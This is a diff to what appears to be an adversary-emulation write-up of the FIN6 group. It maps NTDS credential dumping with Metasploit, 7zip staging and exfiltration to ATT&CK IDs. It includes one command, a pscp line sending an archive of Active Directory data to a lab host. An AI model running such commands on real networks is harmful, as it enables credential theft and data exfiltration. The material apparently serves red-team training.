@@ -74,6 +74,26 @@ creds_all
 
 ![Privilege Escalation 1,2](Phase1/Screenshots/2.png)
 
+FIN6 was reported to  use Metasploit's psexec_ntdsgrab module. This module authenticates to the domain controller, creates a volume shadow copy of the system drive, and downloads copies of the NTDS.dit and SYSTEM hive. 
+OS Credential Dumping: NTDS: T1003.003 
+
+![Privilege Escalation 3](Phase1/Screenshots/3.png)
+
+#### Collection
+
+FIN6 was reported to  use 7zip (7.exe), on the designated staging system, to compress the text files resulting from internal discovery.
+Archive Collected Data: Archive via Utility: T1560.001 
+
+![Privilege Escalation 3](Phase1/Screenshots/4.png)
+
+#### Exfiltration 
+
+FIN6 was reported to exfiltrate the 7Zip files resulting from the Discovery Phase via SSH
+Exfiltration Over Web Service: Exfiltration to Cloud Storage: T1567.002
+
+```sh
+pscp.exe -P {port} {path_on_windows}\ad.7z root@192.168.1.13:/temp/
+```
 
 ## Credits
 
